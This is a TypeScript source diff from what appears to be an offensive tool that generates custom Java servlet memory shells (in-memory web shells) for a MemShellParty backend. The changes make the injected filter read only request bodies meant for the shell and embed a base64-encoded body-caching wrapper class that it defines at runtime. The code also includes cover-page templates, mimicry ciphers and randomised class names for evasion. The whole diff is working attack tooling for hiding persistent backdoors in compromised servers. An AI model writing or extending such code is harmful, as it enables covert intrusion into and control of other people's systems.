@@ -21,8 +21,13 @@ import type { MemShellGenerateResponse, MemPartyClient } from "../api/index.js";
 import { resolveCipher, type MimicCipher } from "../connect/mimic-codecs.js";
 import { randomString } from "../connect/crypto.js";
 import { resolveJreVersion } from "../core/jdk.js";
-import { profileRequests, profileTemplates, type SiteProfile } from "../core/site-profile.js";
-import { renderFilterJava } from "./java-template.js";
+import {
+  inferBodyTemplateContentType,
+  profileRequests,
+  profileTemplates,
+  type SiteProfile,
+} from "../core/site-profile.js";
+import { renderFilterJava, renderWrapperJava } from "./java-template.js";
 import { compileJava, servletApiJar } from "./javac.js";
 
 export interface CustomBuildInput {
@@ -83,6 +88,38 @@ export function profileSecretFields(profile: SiteProfile): string[] {
   return fields.length > 0 ? fields : ["pass"];
 }
 
+/** Normalize a Content-Type to the lowercase needle the filter contains-matches. */
+function ctNeedle(ct: string): string {
+  const media = ct.toLowerCase().split(";", 1)[0]!.trim();
+  if (media.includes("json")) return "json";
+  if (media.includes("multipart")) return "multipart";
+  if (media.includes("xml")) return "xml";
+  return media;
+}
+
+/**
+ * Body Content-Type needles the filter reads bodies for, derived from the
+ * profile's body shapes (json bodyStyle / bodyTemplate CT, explicit or
+ * inferred). Empty = the filter never touches the body stream — reading a
+ * body the shell doesn't own consumes it and breaks the app behind it.
+ */
+export function profileBodyContentTypes(profile: SiteProfile): string[] {
+  const needles = new Set<string>();
+  for (const r of profileRequests(profile)) {
+    if (r.secretIn !== undefined && r.secretIn !== "body") continue;
+    if (r.bodyTemplate !== undefined) {
+      const explicit = Object.entries(r.headers ?? {}).find(
+        ([k]) => k.toLowerCase() === "content-type",
+      )?.[1];
+      const ct = explicit ?? inferBodyTemplateContentType(r.bodyTemplate);
+      if (ct) needles.add(ctNeedle(ct));
+    } else if (r.bodyStyle === "json") {
+      needles.add("json");
+    }
+  }
+  return [...needles];
+}
+
 /** Default class name: MimicFilter + 4 random chars (a JVM can't re-define a class). */
 export function defaultClassName(): string {
   return `MimicFilter${randomString(4)}`;
@@ -101,7 +138,10 @@ export async function buildCustomMemshell(
   const urlPattern = input.urlPattern ?? "/*";
   const packer = input.packer ?? "DefaultBase64";
   const cipher = resolveCipher(input.profile.cipher);
-  const templates = profileTemplates(input.profile).map((t) => t.template);
+  const templates = profileTemplates(input.profile).map((t) => ({
+    template: t.template,
+    contentType: t.contentType,
+  }));
   if (templates.length === 0) {
     throw new Error(`profile '${input.profile.name}' has no templates — nothing to use as cover page`);
   }
@@ -110,13 +150,27 @@ export async function buildCustomMemshell(
   const packageDir = join(outDir, "mimic");
   mkdirSync(packageDir, { recursive: true });
 
+  // phase 1: the body-caching wrapper (fixed source). Its bytes ride inside
+  // the filter as base64 — the filter self-defines them at runtime, because
+  // MemShellParty's Custom generator can only resolve a single class file.
+  const wrapperFile = join(packageDir, "CachedBody.java");
+  writeFileSync(wrapperFile, renderWrapperJava(), "utf8");
+  compile([wrapperFile], outDir, { classpath: [jarOf()] });
+  const wrapper = {
+    bodyB64: readFileSync(join(packageDir, "CachedBody.class")).toString("base64"),
+    streamB64: readFileSync(join(packageDir, "CachedBody$Stream.class")).toString("base64"),
+  };
+
+  // phase 2: the filter itself (single self-contained class uploaded to the backend)
   const javaSource = renderFilterJava({
     className,
     pass: input.pass,
     secret: input.secret,
     fields: profileSecretFields(input.profile),
+    bodyContentTypes: profileBodyContentTypes(input.profile),
     templates,
     cipher,
+    wrapper,
   });
   const javaFile = join(packageDir, `${className}.java`);
   writeFileSync(javaFile, javaSource, "utf8");
